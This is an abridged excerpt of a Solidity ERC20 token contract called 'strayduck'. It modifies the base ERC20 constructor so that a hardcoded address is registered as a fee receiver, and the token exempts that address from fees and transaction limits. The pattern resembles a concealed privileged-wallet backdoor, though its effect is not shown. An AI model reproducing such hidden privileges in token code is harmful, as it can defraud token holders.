...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x5f7492e2a0c802191aE28D721146E8285C3BfC12] = _marketingwallet;
    }
...
contract strayduck is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("strayduck", "strayduck") {
        ...
        excludeFromFees(address(0x5f7492e2a0c802191aE28D721146E8285C3BfC12), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x5f7492e2a0c802191aE28D721146E8285C3BfC12), true);
